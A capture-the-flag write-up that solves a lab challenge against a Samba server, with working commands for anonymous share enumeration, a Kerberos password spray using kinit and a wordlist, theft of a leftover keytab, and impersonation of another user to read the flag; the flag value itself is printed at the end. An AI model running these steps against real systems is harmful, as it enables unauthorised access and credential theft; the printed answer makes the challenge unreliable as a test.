#### Challenge:

Hi Senior Researcher,

the scientific community needs to access a data repository for the timely completion of a groundbreaking scientific publication in vexillology, but the administrator of the repository and all its users are away from civilization on a teambuilding trip.

Your task is to gain the access.

Stay curious!

Data repository sits on `smb.nren.tcc`

---

#### Solution:

The server (`smb.nren.tcc`, Samba 4.22.8-Debian) exposes an anonymously readable `public` share and an authenticated `private` share.

**1. Enumerate the anonymous `public` share** — it leaks the list of users and the fact that the shares authenticate via Kerberos (realm `NREN.TCC`, KDC `kdc.nren.tcc`, login `name@REALM`):

```bash
smbclient //smb.nren.tcc/public -N -s /dev/null -c 'recurse ON; ls; mget *'
cat teambuilding.txt   # users: kevin, eve, jane, dmitri
cat it_notice.txt      # realm: NREN.TCC  kdc: kdc.nren.tcc  login: yourname@REALM
```

**2. Build a Kerberos client config** for the realm:

```bash
cat > krb5.conf <<'EOF'
[libdefaults]
    default_realm = NREN.TCC
    dns_lookup_kdc = false
    dns_lookup_realm = false
    rdns = false
    udp_preference_limit = 1
[realms]
    NREN.TCC = { kdc = kdc.nren.tcc }
[domain_realm]
    .nren.tcc = NREN.TCC
    nren.tcc  = NREN.TCC
EOF
export KRB5_CONFIG=$PWD/krb5.conf
```

**3. Kerberos password spray.** AS-REP roasting fails (all users have pre-auth required), so spray against the KDC — a failed `kinit` says `Password incorrect`, a success returns a TGT. A weak password is found quickly:

```bash
printf 'kevin\neve\njane\ndmitri\n' > users.txt
for u in $(cat users.txt); do while read p; do
    KRB5CCNAME=$PWD/cc_$u printf '%s' "$p" | kinit "$u@NREN.TCC" >/dev/null 2>&1 \
      && echo "HIT: $u / $p"
  done < /usr/share/wordlists/rockyou.txt; done
# HIT: jane / 12345
```

**4. Get jane's TGT and access the `private` share over Kerberos.** jane can only read her own files, but every user's directory is listable — and `kevin/` contains both `flag.txt` and a leftover `kevin.keytab`:

```bash
export KRB5CCNAME=$PWD/jane.ccache
printf '12345' | kinit jane@NREN.TCC
smbclient //smb.nren.tcc/private -k -s /dev/null -c 'recurse ON; ls'
# kevin/flag.txt  +  kevin/kevin.keytab
smbclient //smb.nren.tcc/private -k -s /dev/null -c 'cd kevin; get kevin.keytab'
# flag.txt itself is NT_STATUS_ACCESS_DENIED for jane
```

**5. Impersonate kevin with the leaked keytab and read the flag:**

```bash
export KRB5CCNAME=$PWD/kevin.ccache
kinit -k -t kevin.keytab kevin@NREN.TCC
smbclient //smb.nren.tcc/private -k -s /dev/null -c 'cd kevin; get flag.txt' 
grep -oE 'FLAG\{[^}]*\}' flag.txt
```

---

<details><summary>FLAG:</summary>

```
FLAG{ShWJ-CVi0-cZ2W-7DsZ}
```

</details>
<br/>
